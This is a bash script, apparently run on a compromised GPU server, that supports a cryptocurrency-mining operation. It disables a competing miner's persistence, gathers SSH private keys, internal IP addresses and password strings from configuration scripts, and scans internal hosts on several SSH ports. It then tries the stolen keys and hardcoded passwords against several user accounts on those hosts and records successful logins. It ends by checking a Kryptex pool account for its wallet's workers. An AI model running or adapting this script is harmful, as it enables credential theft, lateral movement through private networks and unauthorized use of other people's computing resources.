#!/bin/bash
# i4981 run4: verify/harden plant, harden vs plh keepalive, harvest installer scripts+keys, peer rung2
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P1='Admin@123_para#!2024'; P2='Beijingcs.2024'; P3='Bingxing.2026'; P4='ubuntu@'; P5='Kgzs@2024'; P6='ij2gooDe^y'

log "### META $(date -u +%FT%TZ)"; hostname
log "### PLH-REGEN-CHECK"
lsattr /opt/plh/keepalive.sh /opt/plh 2>&1 | head -5
lsattr /etc/cron.d/plh-keepalive 2>&1
log "-- plh procs: $(pgrep -fc 'plh-123-184-7-135' )"
log "-- our units: $(systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l)"
log "-- plh units enabled: $(systemctl is-enabled plh-card@0 2>&1)"
log "-- try unimmutable + neutralize"
chattr -i /opt/plh 2>&1 | head -1
chattr -i /opt/plh/keepalive.sh 2>&1 | head -1
chattr -i /etc/cron.d/plh-keepalive 2>&1 | head -1
printf '#!/bin/sh\nexit 0\n' > /opt/plh/keepalive.sh 2>/dev/null && echo KEEPALIVE_NEUTERED || echo KEEPALIVE_LOCKED
rm -f /etc/cron.d/plh-keepalive 2>/dev/null && echo CRON_REMOVED || echo CRON_LOCKED
rm -f /etc/systemd/system/plh-card@.service 2>/dev/null && systemctl mask plh-card@.service 2>&1 | head -1 || echo UNITFILE_LOCKED
for i in 0 1 2 3 4 5 6 7; do systemctl disable plh-card@$i >/dev/null 2>&1; done
log "-- after: units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l)"

log "### SCRIPT-HARVEST"
for f in /root/conf/ids.sh /root/conf/config /root/conf/env.sh /root/conf/batch_install.sh /root/conf/check_nodes.sh /root/conf/IB_HCA_check.sh /root/conf/hostname.sh /root/conf/set_sudonopasswd.sh /root/conf/full-comfile.sh /root/conf/1to1_nccl_tests.sh /root/conf/b200_ceph_storage_mount.sh /root/conf/h800_share_storage.sh /root/conf/health_check.sh /root/conf/change_hostname.sh /root/conf/ubuntu_copy_id_rsa.sh /root/conf/kgzs_copy_id_rsa.sh /root/conf/root_copy_id_rsa.sh; do
  [ -f "$f" ] && { log "===== $f"; sed -n '1,120p' "$f"; }
done
log "-- .tmp/.Temp"
find /root/conf/.tmp /root/conf/.Temp -maxdepth 3 2>/dev/null | head -40
for f in $(find /root/conf/.tmp /root/conf/.Temp -maxdepth 3 -type f 2>/dev/null | head -12); do log "== $f ($(stat -c%s "$f")B)"; head -40 "$f"; done
log "-- key-ish files"
find /root/.ssh /root/conf -maxdepth 3 -type f \( -name '*id_*' -o -name '*.pem' -o -name '*key*' -o -name '*rsa*' \) 2>/dev/null | head -30
log "-- ssh dir"; ls -la /root/.ssh
log "-- batch scripts mentioning hosts"
grep -nhoE '(172\.16\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)' /root/conf/*.sh 2>/dev/null | sort | uniq -c | sort -rn | head -25
log "-- password-ish strings in conf scripts"
grep -rniE 'passw|passwd|password|pwd=|--password|sshpass|expect' /root/conf/*.sh /root/conf/*.md 2>/dev/null | cut -c1-200 | head -40

log "### PEER-RUNG2"
which sshpass >/dev/null || timeout 120 apt-get install -y -qq sshpass >/dev/null 2>&1
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"
# additional ports
log "-- alt-ports"
for ip in 172.16.11.13 172.16.11.14 172.16.10.71 10.242.32.6 10.251.10.107 10.80.80.12 10.100.80.5 172.16.21.11; do
  for p in 22 2222 20022 22022; do
    timeout 4 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "PORT_OPEN $ip $p"
  done
done
# key ladder on live hosts
KEYS=$(find /root/.ssh /root/conf -maxdepth 3 -type f \( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name 'root_rsa' -o -name 'ssh_rsa' -o -name 'ubuntu_rsa' \) 2>/dev/null | head -2)
log "-- keys found: $(echo $KEYS | tr '\n' ' ')"
KK=0
for ip in 192.168.0.20 192.168.0.22 192.168.0.31 10.0.0.2 10.0.0.5; do
  for k in $KEYS; do
    for u in root ubuntu kgzs; do
      O=$(timeout 8 ssh -i "$k" $OPTS -o IdentitiesOnly=yes -o BatchMode=yes "$u"@"$ip" 'id -un; hostname' 2>&1 | tr '\n' '|')
      case "$O" in *uid=*|root\|*|*g00*\|*) echo "KEYHIT $ip $u $(basename $k) :: $O";;
        *"Permission denied"*|*"Connection refused"*) : ;;
        *) echo "KEYOTHER $ip $u $(basename $k) :: $(echo $O | cut -c1-80)";;
      esac
    done
  done
done
# password rung2 with extra users/passwords
for ip in 192.168.0.20 192.168.0.21 192.168.0.22 10.0.0.2 10.0.0.3 10.0.0.5 10.0.0.9; do
  for pr in "root|$P6" "ubuntu|$P1" "ubuntu|$P2" "ubuntu|$P6" "para|$P1" "para|$P6" "admin|$P1" "kgzs|$P1"; do
    u=${pr%%|*}; p=${pr#*|}
    O=$(timeout 9 sshpass -p "$p" ssh $OPTS -o PreferredAuthentications=password -o PubkeyAuthentication=no "$u"@"$ip" 'id -un; hostname' 2>&1 | tr '\n' '|')
    case "$O" in *uid=*|root\|*|*g00*\|*) echo "PWHIT $ip $u :: $O"; echo "$ip $u $p" >> /root/ul_farmfan/hits_run4.txt;; esac
  done
done
log "-- hits4: $(cat /root/ul_farmfan/hits_run4.txt 2>/dev/null | tr '\n' ' ')"

log "### POOL-FINAL"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run4.json; echo size=$(stat -c%s $D/pool_run4.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run4.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "-- gpu"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader | head -8
log "-- units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l)"
log "### DONE $(date -u +%FT%TZ)"
